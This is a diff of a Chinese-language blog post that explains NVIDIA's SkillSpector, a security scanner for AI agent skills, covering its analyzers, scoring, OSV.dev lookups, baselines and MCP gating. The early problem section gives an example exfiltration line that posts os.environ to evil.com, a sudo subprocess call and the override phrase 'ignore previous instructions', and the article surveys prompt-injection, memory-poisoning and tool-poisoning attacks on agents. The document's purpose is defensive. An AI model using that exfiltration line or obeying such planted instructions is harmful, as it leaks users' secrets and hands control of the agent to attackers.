@@ -1,23 +1,21 @@
 ---
-title: "NVIDIA SkillSpector：让 26% 不安全的 agent skill 无处藏身"
+title: "NVIDIA SkillSpector：让 26% 不安全的 agent（智能体）skill 无处藏身"
 date: 2026-06-26T20:36:00+08:00
-draft: false
-categories:
-  - 技术笔记
+categories: ["技术笔记"]
 tags: ["AI 安全", "NVIDIA", "开源项目"]
 slug: nvidia-skillspector-agent-skill-security-scanner
 github_repo: "NVIDIA/SkillSpector"
-author: 钳岳星君
+source_key: "gh:NVIDIA/SkillSpector"
 description: "NVIDIA 开源的 agent skill 安全扫描器，68 个漏洞模式覆盖 17 大类、22 个 LangGraph 分析器并行、OSV.dev 实时对接 CVE、基线抑制 + MCP runtime gating，把「这个 skill 安不安全」从直觉判断变成 SARIF 可机读结论。"
 ---
 
-# NVIDIA SkillSpector：让 26% 不安全的 agent skill 无处藏身
+# NVIDIA SkillSpector：让 26% 不安全的 agent（智能体）skill 无处藏身
 
 ## 核心判断
 
 2026 年 3 月 21 日，NVIDIA 在 GitHub 开源了 [SkillSpector](https://github.com/NVIDIA/SkillSpector)——一个专门扫描 AI agent skill 安全的静态 + 语义分析器。截至 6 月 26 日，这个仅 3 个月的项目已经攒到 10,825 stars / 878 forks。
 
-**它的核心功能**：在用户把一个 skill 装进 Claude Code / Codex CLI / Gemini CLI 之前，先回答「这个 skill 安不安全」。
+**它的核心功能**：在用户把一个 skill 装进 Claude Code / Codex CLI（命令行工具）/ Gemini CLI 之前，先回答「这个 skill 安不安全」。
 
 支撑这个判断的统计数字来自 SkillSpector 的研究：「26.1% 的 skill 含漏洞，5.2% 显示明确的恶意意图」。
 
@@ -25,7 +23,7 @@ description: "NVIDIA 开源的 agent skill 安全扫描器，68 个漏洞模式�
 - 当你从任意渠道拉来一个第三方 skill，平均每 4 个就有 1 个存在安全问题
 - 每 20 个就有 1 个有恶意成分
 
-skill 是 agent 时代的事实代码分发单元——一份 SKILL.md + 几个脚本 + 一个 requirements.txt，就足以让一个 agent 接管用户的本机和外部 API。
+skill 是 agent 时代的事实代码分发单元——一份 SKILL.md + 几个脚本 + 一个 requirements.txt，就足以让一个 agent 接管用户的本机和外部 API（应用程序接口）。
 
 在这种分发模型下，「是不是把 skill 当 npm 包做 SCA（软件成分分析）」就变成必须回答的问题。
 
@@ -37,18 +35,18 @@ SkillSpector 给出的工程回答由四块构成：
 
 - **68 个漏洞模式**横跨 17 大类（提示词注入、数据外传、权限提升、供应链、过度代理、YARA 恶意软件签名、MCP 最小权限、MCP tool poisoning 等）
 - **22 个 LangGraph 分析器**并行运行，每个分析器只负责一类漏洞，输出统一的 `Finding` 格式
-- **0-100 风险评分**配合四级 severity（LOW/MEDIUM/HIGH/CRITICAL）和三级 recommendation（SAFE/CAUTION/DO_NOT_INSTALL），可机读、可接入 CI/CD
+- **0-100 风险评分**配合四级 severity（LOW/MEDIUM/HIGH/CRITICAL）和三级 recommendation（SAFE/CAUTION/DO_NOT_INSTALL），可机读、可接入 CI/CD（持续集成/持续部署）
 - **MCP server 模式**让 agent 在 install skill 的同一调用栈里直接 gate，把扫描从「外部审计步骤」变成「运行时护栏」
 
 **几个实用要点**：
 
-- 它是 NVIDIA 出的开源项目，但**模型层不绑 NVIDIA 生态**——LLM provider 支持 `openai` / `anthropic` / `anthropic_proxy` / `nv_build` 四家，本地 Ollama / vLLM 也能接（通过 `OPENAI_BASE_URL` 覆盖）
+- 它是 NVIDIA 出的开源项目，但**模型层不绑 NVIDIA 生态**——LLM（大语言模型）provider 支持 `openai` / `anthropic` / `anthropic_proxy` / `nv_build` 四家，本地 Ollama / vLLM 也能接（通过 `OPENAI_BASE_URL` 覆盖）
 - **不依赖云端**：默认 `--no-llm` 走纯静态分析；只有开 LLM 时才需要凭证，凭证失败时降级
-- **真实部署友好**：能直接接 OSV.dev 实时拉 CVE、能输出 SARIF 2.1.0 给 IDE/GitHub Code Scanning、能写 baseline 让增量 CI 只报警「新增漏洞」
+- **真实部署友好**：能直接接 OSV.dev 实时拉 CVE、能输出 SARIF 2.1.0 给 IDE（集成开发环境）/GitHub Code Scanning、能写 baseline 让增量 CI 只报警「新增漏洞」
 
 这篇文章拆开 SkillSpector 的内部工作：它解决了什么问题、22 个分析器怎么并行协作、一次扫描如何流过系统，以及如何在自家 CI 里把它接起来。
 
-## 学习目标
+## 本文目标与收获
 
 读完本文后，你应该能够：
 
@@ -72,26 +70,27 @@ SkillSpector 给出的工程回答由四块构成：
 ## 目录
 
 - [核心判断](#核心判断)
-- [学习目标](#学习目标)
+- [本文目标与收获](#本文目标与收获)
 - [SkillSpector 解决了什么问题](#skillspector-解决了什么问题)
-- [总览图：22 个分析器怎么并行协作](#总览图22-个分析器怎么并行协作)
+- [总览图：22 个分析器怎么并行协作](#总览图-22-个分析器怎么并行协作)
 - [17 大类 68 模式的全景](#17-大类-68-模式的全景)
 - [任务如何流过系统：一次完整扫描](#任务如何流过系统一次完整扫描)
 - [0-100 评分机制详解](#0-100-评分机制详解)
-- [OSV.dev 实时漏洞对接（SC4 案例）](#osvdev-实时漏洞对接sc4-案例)
+- [OSV.dev 实时漏洞对接（SC4 案例）](#osv-dev-实时漏洞对接-sc4-案例)
+
 - [两阶段分析：静态 + LLM 语义](#两阶段分析静态-llm-语义)
 - [Baseline 抑制与增量 CI](#baseline-抑制与增量-ci)
 - [MCP server 模式：把扫描变成运行时护栏](#mcp-server-模式把扫描变成运行时护栏)
-- [决策启示：skill 作者 / 集成方 / 安全团队各看什么](#决策启示skill-作者-集成方-安全团队各看什么)
+- [决策启示](#决策启示-skill-作者-集成方-安全团队各看什么)
 - [采用顺序与边界](#采用顺序与边界)
 - [常见问题](#常见问题)
 - [进阶练习](#进阶练习)
-- [进阶路径](#进阶路径)
+- [进阶：继续深入的方向](#进阶继续深入的方向)
 - [参考资料](#参考资料)
 
 ## SkillSpector 解决了什么问题
 
-Skill 的本质是一份 Markdown 说明 + 一组脚本 + 一组依赖。在 Claude Code、Codex CLI、Gemini CLI 这类 agent 运行时里，**skill 拿到了与用户同等的工具调用权限**——它能读文件、能执行命令、能调外部 API。skill 没有 sandbox，没有代码签名，没有 CVE 数据库，更没有 review 流程。
+Skill 的本质是一份 Markdown 说明 + 一组脚本 + 一组依赖。在 Claude Code、Codex CLI、Gemini CLI 这类 agent 运行时里，**skill 拿到了与用户同等的工具调用权限**——它能读文件、能执行命令、能调外部 API。skill 没有 sandbox（沙箱），没有代码签名，没有 CVE 数据库，更没有 review 流程。
 
 **这个分发模型的安全水位远低于 npm**：
 
@@ -99,7 +98,7 @@ npm 上有 package-lock、有 SCA、有 Snyk；但一个 agent skill 通常是�
 
 在这种模式下，攻击成本极低：
 
-- **prompt injection** 在 SKILL.md 的正文里直接以「忽略之前指令」的形式出现，模型读到就照做
+- **prompt（提示词）injection** 在 SKILL.md 的正文里直接以「忽略之前指令」的形式出现，模型读到就照做
 - **data exfiltration** 用一行 `requests.post("https://evil.com", json=os.environ)` 完成
 - **privilege escalation** 通过 `subprocess.run(["sudo", ...])` 触发
 - **supply chain attack** 通过未固定版本的依赖（`requirements.txt` 里只写 `requests`，不带版本约束）落地
@@ -110,7 +109,7 @@ SkillSpector 把「这个 skill 安不安全」从直觉判断转换成 SARIF 2.
 
 SkillSpector 的核心抽象是**统一的 `Finding` dataclass**（`models.py` 里定义）：
 
-```
+```text
 rule_id        # 例如 "P3"、"AST8"、"SC4"
 severity       # LOW | MEDIUM | HIGH | CRITICAL
 confidence     # 0-1，浮点数
@@ -120,7 +119,7 @@ remediation    # 修复建议
 tags           # 类别标签
 ```
 
-每个分析器（22 个）输出 `list[Finding]`，LangGraph 把所有 finding 用 `operator.add` reducer 聚合到 `state["findings"]`，最后由 `report` 节点做 baseline 抑制、风险评分、SARIF 序列化、终端/Markdown 输出。
+每个分析器（22 个）输出 `list[Finding]`，LangGraph 把所有 finding 用 `operator.add` reducer 聚合到 `state（状态）["findings"]`，最后由 `report` 节点做 baseline 抑制、风险评分、SARIF 序列化、终端/Markdown 输出。
 
 ### 为什么统一的 Finding 格式很重要
 
@@ -138,13 +137,18 @@ SkillSpector v2 的 LangGraph workflow 形状非常标准——`resolve_input` �
 
 整张图没有条件边、没有循环，分析器之间不通信，状态全部走 `SkillspectorState` TypedDict。
 
-```
+```text
                 START
                   │
                   ▼
             resolve_input
             （Git URL / zip / 单文件 / 目录
              → skill_path + 可选 temp_dir）
+```
+
+`resolve_input` 完成后进入 `build_context`，扫描文件并构建上下文缓存：
+
+```text
                   │
                   ▼
             build_context
@@ -152,6 +156,11 @@ SkillSpector v2 的 LangGraph workflow 形状非常标准——`resolve_input` �
              file_cache / ast_cache
              manifest / component_metadata
              has_executable_scripts）
+```
+
+输入经过解析和上下文构建后，到达 fan-out 阶段——22 个分析器并行启动：
+
+```text
                   │
        ┌──────────┴──────────┐
        ▼          ▼          ▼          ▼
@@ -159,28 +168,35 @@ SkillSpector v2 的 LangGraph workflow 形状非常标准——`resolve_input` �
    (13 个)    (2 个)         (3 个)  (3 个)
        │          │          │          │
        └──────────┴──────────┴──────────┘
+```
+
+所有分析器的 finding 汇聚到 fan-in 节点，经 LLM 过滤后进入报告生成：
+
+```text
                           │
                           ▼
                   meta_analyzer
              （LLM 过滤 / 富化
               每个 file 一次 LLM 调用
-              受 token budget 约束
+              受 token（词元）budget 约束
               use_llm=false 时直接跳过）
-                          │
-                          ▼
+```
+
+`meta_analyzer` 完成后，`report` 节点负责最终输出：
+
+```text
                       report
              （baseline 抑制
               risk_score 计算
               SARIF 2.1.0 序列化
               输出 terminal/json/md/sarif）
-                          │
-                          ▼
-                         END
 ```
+
+最后到达 END 节点，扫描流程结束。
 
 ### 并行执行的实现
 
-每个分析器是 LangGraph 里的一个 node。它们之间没有任何依赖关系，所以 LangGraph 可以让它们真正并行执行：
+每个分析器是 LangGraph 里的一个 node（节点）。它们之间没有任何依赖关系，所以 LangGraph 可以让它们真正并行执行：
 
 - 如果用 async runner，CI 跑同一个 skill 时 22 路并发
 - 同步 runner 下也是 fan-out 之后 fan-in 的逻辑顺序，但每个分析器内部都是独立的
@@ -193,7 +209,7 @@ SkillSpector v2 的 LangGraph workflow 形状非常标准——`resolve_input` �
 |---|---|---|
 | **static_patterns_*** | 13 | `prompt_injection` (P1-P4)、`data_exfiltration` (E1-E4)、`privilege_escalation` (PE1-PE3)、`excessive_agency` (EA1-EA4)、`supply_chain` (SC1-SC6)、`tool_misuse` (TM1-TM3)、`rogue_agent` (RA1-RA2)、`system_prompt_leakage` (P6-P8)、`memory_poisoning` (MP1-MP3)、`agent_snooping`、`anti_refusal` (AR1-AR3)、`harmful_content` (P5)、`output_handling` (OH1-OH3)、`ssrf` |
 | **behavioral_*** | 2 | `behavioral_ast` (AST1-AST9)、`behavioral_taint_tracking` (TT1-TT5) |
-| **mcp_*** | 3 | `mcp_least_privilege` (LP1-LP4)、`mcp_tool_poisoning` (TP1-TP4)、`mcp_rug_pull` (stub) |
+| **mcp_*** | 3 | `mcp_least_privilege` (LP1-LP4)、`mcp_tool_poisoning` (TP1-TP4)、`mcp_rug_pull`（stub，桩实现） |
 | **semantic_*** | 3 | `semantic_security_discovery`、`semantic_developer_intent`、`semantic_quality_policy` |
 | **static_yara** | 1 | YR1-YR4（恶意软件 / webshell / 挖矿 / 黑客工具） |
 | **static_patterns_supply_chain** (含 OSV.dev) | 1 | SC4 实时 |
@@ -226,7 +242,7 @@ P5（harmful content）单独归到 `static_patterns_harmful_content.py`。每�
 `static_patterns_data_exfiltration.py` 抓 E1-E4：
 
 1. **外发数据到外部 URL**
-2. **抓环境变量**（API key / token）
+2. **抓环境变量**（API key / token（词元））
 3. **文件系统枚举**（`os.walk('/home')`）
 4. **上下文外泄**
 
@@ -308,6 +324,11 @@ MP1+MP3 联合起来就是「skill 永久改写 agent 行为」的攻击模式�
 | AST3 | `__import__()` | HIGH |
 | AST4 | `subprocess` module | HIGH |
 | AST5 | `os.system` 或 exec-family | HIGH |
+
+以上是直接的危险函数调用检测。AST6-AST9 则覆盖更间接的模式：
+
+| 编号 | 检测内容 | 严重程度 |
+|---|---|---|
 | AST6 | `compile()` | MEDIUM |
 | AST7 | 动态 `getattr()` | LOW |
 | AST8 | exec/eval + 动态来源（网络、编码数据） | CRITICAL |
@@ -340,7 +361,7 @@ MP1+MP3 联合起来就是「skill 永久改写 agent 行为」的攻击模式�
 - **YR3**：挖矿
 - **YR4**：黑客工具/exp 代码
 
-### MCP Least Privilege (4) + MCP Tool Poisoning (4) + MCP Rug Pull (3 stub)
+### MCP Least Privilege (4) + MCP Tool Poisoning (4) + MCP Rug Pull（拉取攻击）(3 stub（桩）)
 
 **LP1-LP4** 检测 MCP server 的权限声明是否与代码实际能力匹配：
 
@@ -356,7 +377,7 @@ MP1+MP3 联合起来就是「skill 永久改写 agent 行为」的攻击模式�
 - 参数描述注入
 - 声明行为与代码行为不匹配
 
-**RP1-RP3** 是 stub（占位实现），未来要检测 MCP server 在 install 后悄悄升级的「rug pull」攻击。
+**RP1-RP3** 是 stub（占位实现），未来要检测 MCP server 在 install 后悄悄升级的「rug pull（拉取攻击）」。
 
 ## 任务如何流过系统：一次完整扫描
 
@@ -364,7 +385,7 @@ MP1+MP3 联合起来就是「skill 永久改写 agent 行为」的攻击模式�
 
 **场景**：用户在某个 agent 社区下载到一个 skill `suspicious-skill/`，目录结构：
 
-```
+```text
 suspicious-skill/
 ├── SKILL.md              # 含 prompt injection + 反拒绝指令
 ├── scripts/sync.py       # 含 env 抓取 + 外传 + subprocess
@@ -451,29 +472,24 @@ skillspector scan ./suspicious-skill/
 
 #### 最终 terminal 输出示例
 
-```
+```text
  SkillSpector Security Report  v2.0.0
-
-Skill: suspicious-skill
-Source: ./suspicious-skill/
-Scanned: 2026-01-29 10:30:00 UTC
-
+Skill: suspicious-skill  Source: ./suspicious-skill/  Scanned: 2026-01-29
         Risk Assessment
  Metric          Value
  Score           78/100
  Severity        HIGH
  Recommendation  DO NOT INSTALL
+```
 
-Issues (8)
+报告共检出 8 个问题，按严重程度排列：
 
-  CRITICAL: Taint Flow - Credential to Network (TT3)
-    Location: scripts/sync.py:23-45
-  HIGH: Env Variable Harvesting (E2)
-  HIGH: External Transmission (E1)
-  HIGH: Known Vulnerable Dependencies (SC4)
-  HIGH: Subprocess Module Call (AST4)
-  HIGH: Instruction Override (P1)
-  HIGH: Refusal Suppression (AR1)
+```text
+Issues (8): 1 CRITICAL, 5 HIGH, 1 MEDIUM
+  CRITICAL: Taint Flow (TT3)  Location: scripts/sync.py:23-45
+  HIGH: Env Variable Harvesting (E2) | External Transmission (E1)
+  HIGH: Known Vulnerable Dependencies (SC4) | Subprocess Module (AST4)
+  HIGH: Instruction Override (P1) | Refusal Suppression (AR1)
   MEDIUM: Unpinned Dependencies (SC1)
 ```
 
@@ -530,7 +546,7 @@ _KNOWN_VULNERABLE_NPM = [...]        # 9 个 npm 包
 
 1. **staleness**——24 条 vs. 真实世界成千上万条 advisory，CVE 每天都在披露
 2. **manual maintenance**——每次更新要改代码、过 review、发 release
-3. **incomplete coverage**——只覆盖热门包；冷门包或 transitive 依赖完全漏掉
+3. **incomplete coverage（覆盖率）**——只覆盖热门包；冷门包或 transitive 依赖完全漏掉
 4. **version logic fragile**——自写的 `_version_lt()` 比较器对 pre-release、日期版本（`certifi 2022.12.07`）、epoch prefix 处理不对
 
 ### 新方案：OSV.dev
@@ -546,12 +562,17 @@ _KNOWN_VULNERABLE_NPM = [...]        # 9 个 npm 包
 
 ### SC4 现在的工作流
 
-```
+```text
 _extract_packages_from_requirements()  →  [(name, version, line_num)]
    ↓
 osv_client.query_batch()  →  vuln IDs
    ↓
 osv_client.get_vuln_details()  →  severity + summary
+```
+
+拿到漏洞详情后，发射 SC4 Finding；如果 OSV.dev 不可达，降级到离线 fallback：
+
+```text
    ↓
 emit SC4 Finding
    ↓
@@ -560,7 +581,7 @@ on failure  →  fall back to _FALLBACK_VULNERABLE_PYPI (offline 模式)
 
 #### 关键设计决策
 
-1. **同步而非异步**：单次 batch query < 500ms，分析器管道是同步的，没必要上 async
+1. **同步而非异步**：单次 batch query（查询）< 500ms，分析器管道是同步的，没必要上 async
 2. **内存缓存 + 1 小时 TTL**：多个 skill 共享依赖时避免重复请求
 3. **graceful degradation**：OSV.dev 不可达时回到静态 fallback 列表 + warning log（保证 air-gapped 环境也能用）
 4. **每个包最多取 10 个 advisory**：延迟可控，多了会拖慢扫描
@@ -667,13 +688,13 @@ fingerprints:
     reason: "Accepted — reads its own environment for context"
 ```
 
-每个 fingerprint 是 finding 的稳定 hash（`sha256(rule_id|file|start_line|end_line|message)` 截断）。
+每个 fingerprint 是 finding 的稳定 hash（哈希）（`sha256(rule_id|file|start_line|end_line|message)` 截断）。
 
 **关键点**：skill 编辑后 fingerprint 失效——这是设计：drift 在 fingerprints 这里就显式了，开发者必须重新跑 `skillspector baseline`。
 
 ### baseline 的处理逻辑
 
-baseline 在 `report.py` 节点里统一处理，CLI 和未来的 REST API 行为一致。
+baseline 在 `report.py` 节点里统一处理，CLI 和未来的 REST（表述性状态转移）API 行为一致。
 
 **重要约束**：被压制的 finding 永远不进 risk score，只在 `--show-suppressed` 或 JSON 的 `suppressed` 字段可见——这避免了「塞满 baseline 假装安全」的反模式。
 
@@ -696,7 +717,7 @@ skillspector mcp --transport http --host 127.0.0.1 --port 8000
 
 这个 server 暴露一个 tool：
 
-```
+```text
 scan_skill(target, use_llm=true, output_format="json")
 → risk_score, severity, recommendation, safe_to_install, findings
 ```
@@ -705,7 +726,7 @@ scan_skill(target, use_llm=true, output_format="json")
 
 agent 拿到这个 tool 后可以跑下面的工作流：
 
-```
+```text
 user: "装 https://github.com/stranger/skills/super-tool"
    ↓
 agent 内部调用 scan_skill(target)
@@ -764,7 +785,7 @@ SkillSpector 的 baseline + 增量 CI 是「持续监测 skill 风险」的最�
 - 跑一次 baseline，把当前所有可接受的 finding 固化
 - 每次 skill 更新跑 `--baseline`，新 finding 立刻报警
 - 用 `--show-suppressed` 定期审计 baseline，避免越压越多
-- 把 SARIF 结果聚合到团队的安全 dashboard
+- 把 SARIF 结果聚合到团队的安全 dashboard（仪表盘）
 
 ## 采用顺序与边界
 
@@ -881,6 +902,16 @@ MCP server 本身只是个 wrapper——扫描逻辑和 CLI 模式完全一样�
 4. **开 LLM 过滤**：如果 false positive 太多，开 `--use-llm` 过滤一次
 5. **写 baseline**：确定接受的 finding 写进 baseline，避免每次 CI 都报警
 
+### 常见错误排查
+
+扫描过程中遇到问题时，按以下思路排查：
+
+- **安装失败**：确认 Python 版本 ≥ 3.10，`pip install skillspector` 拉的是最新版；如果报依赖冲突，试 `pip install "skillspector[mcp]"` 一次性装全
+- **LLM 调用报错**：检查环境变量是否拼写正确（`OPENAI_API_KEY` / `ANTHROPIC_API_KEY`），凭证无效时 SkillSpector 会自动降级到纯静态模式，不会中断扫描
+- **OSV.dev 查询超时**：网络问题会触发 graceful degradation，自动回退到本地 fallback 列表；离线环境可以提前配好 `_FALLBACK_VULNERABLE_PYPI`
+- **SARIF 输出无法导入 IDE**：确认输出格式是 `--output-format sarif`，VS Code 需要装 SARIF Viewer 插件，GitHub Code Scanning 需要上传到 `codeql/` 目录
+- **baseline 抑制了不该抑制的 finding**：用 `--show-suppressed` 查看被压制的列表，逐条检查 `reason` 字段，确认后再决定是否从 baseline 中移除
+
 ## 进阶练习
 
 ### 练习 1：识别 prompt injection（理解型）
@@ -917,7 +948,7 @@ MCP server 本身只是个 wrapper——扫描逻辑和 CLI 模式完全一样�
 <details>
 <summary>参考方案</summary>
 
-1. **提交时扫描**：在 marketplace 的 PR 流程里加一个 GitHub Action，跑 `skillspector scan --output-format sarif`，如果 score > 20 就 block merge
+1. **提交时扫描**：在 marketplace 的 PR 流程里加一个 GitHub Action，跑 `skillspector scan --output-format sarif`，如果 score > 20 就 block merge（合并）
 2. **Baseline 管理**：首次扫描生成 baseline，提交到 git；后续只报警新增 finding
 3. **定期重扫**：用 GitHub Actions 的 `schedule` 事件每周跑一次全量扫描，发现新 HIGH/CRITICAL finding 时自动提 issue 或发 Slack 通知
 
@@ -948,7 +979,7 @@ MCP server 本身只是个 wrapper——扫描逻辑和 CLI 模式完全一样�
 
 </details>
 
-### 练习 4：手写一个简单的AST分析器（实战型）
+### 练习 4：手写一个简单的 AST 分析器（实战型）
 
 假设你要检测 Python 代码里的 `pickle.load()` 调用（反序列化漏洞），请写一个简化的 AST 遍历代码片段来实现。
 
@@ -960,28 +991,26 @@ import ast
 
 class PickleDetector(ast.NodeVisitor):
     def visit_Call(self, node):
-        # 检测 pickle.load() 调用
         if isinstance(node.func, ast.Attribute):
             if node.func.attr == 'load':
                 if isinstance(node.func.value, ast.Name):
                     if node.func.value.id == 'pickle':
                         print(f"Found pickle.load() at line {node.lineno}")
         self.generic_visit(node)
+```
 
-# 使用示例
-code = """
-import pickle
-with open('data.pkl', 'rb') as f:
-    data = pickle.load(f)
-"""
+`PickleDetector` 继承 `ast.NodeVisitor`，重写 `visit_Call` 来匹配 `pickle.load()` 模式。使用时传入目标代码的 AST：
+
+```python
+code = "import pickle\nwith open('data.pkl', 'rb') as f:\n    data = pickle.load(f)"
 tree = ast.parse(code)
 detector = PickleDetector()
-detector.visit(tree)
+detector.visit(tree)  # 输出: Found pickle.load() at line 3
 ```
 
 </details>
 
-## 进阶路径
+## 进阶：继续深入的方向
 
 如果你对 agent 安全感兴趣，可以按以下路径深入：
 
